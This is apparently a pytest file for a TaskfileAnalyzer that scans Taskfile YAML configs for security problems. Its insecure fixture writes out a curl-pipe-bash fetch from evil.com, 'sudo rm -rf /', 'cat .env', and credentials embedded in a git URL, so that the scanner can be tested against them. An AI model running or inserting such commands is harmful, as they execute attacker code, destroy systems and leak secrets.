"""Tests for TaskfileAnalyzer."""

from pathlib import Path

from devai.taskfile_analyzer import TaskfileAnalyzer, TaskfileFinding


INSECURE_TASKFILE = """\
version: '3'

vars:
  API_KEY: "hardcoded-secret-token-12345"

tasks:
  install:
    desc: Install dependencies
    cmds:
      - curl http://evil.com/install.sh | bash
      - sudo rm -rf /
      - cat .env
      - git clone https://user:pass@github.com/org/repo.git

  deploy:
    cmds:
      - export TOKEN=leaked-token-value
"""

HARDENED_TASKFILE = """\
version: '3'

tasks:
  setup:
    desc: Install dependencies
    cmds:
      - pip install -e ".[dev]"

  test:
    cmds:
      - pytest
    env:
      NODE_ENV: test
"""


class TestTaskfileAnalyzer:
    def test_detects_insecure_taskfile(self, tmp_path: Path):
        (tmp_path / "Taskfile.yml").write_text(INSECURE_TASKFILE, encoding="utf-8")
        analyzer = TaskfileAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "curl_pipe_shell" in kinds
        assert "dangerous_shell" in kinds
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert "sensitive_path" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_taskfile_clean(self, tmp_path: Path):
        (tmp_path / "Taskfile.yaml").write_text(HARDENED_TASKFILE, encoding="utf-8")
        analyzer = TaskfileAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "Taskfile.yml").write_text(INSECURE_TASKFILE, encoding="utf-8")
        analyzer = TaskfileAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        finding = next(f for f in findings if f.kind == "hardcoded_secret")
        assert finding.path == "Taskfile.yml"
        assert "[high]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "Taskfile.yml").write_text(INSECURE_TASKFILE, encoding="utf-8")
        analyzer = TaskfileAnalyzer(str(tmp_path))
        assert "Taskfile configs:" in analyzer.summary()
        ctx = analyzer.to_context()
        assert "Taskfile analysis:" in ctx
        assert "health score:" in ctx

    def test_generate_hardened_config(self):
        snippet = TaskfileAnalyzer(".").generate_hardened_config()
        assert "Taskfile.yml" in snippet
        assert "version:" in snippet

    def test_detects_prefixed_taskfile(self, tmp_path: Path):
        (tmp_path / "Taskfile.ci.yml").write_text(INSECURE_TASKFILE, encoding="utf-8")
        analyzer = TaskfileAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert len(findings) > 0
        assert analyzer.stats.configs == 1

    def test_no_configs_returns_clean_score(self, tmp_path: Path):
        analyzer = TaskfileAnalyzer(str(tmp_path))
        assert analyzer.analyze() == []
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()
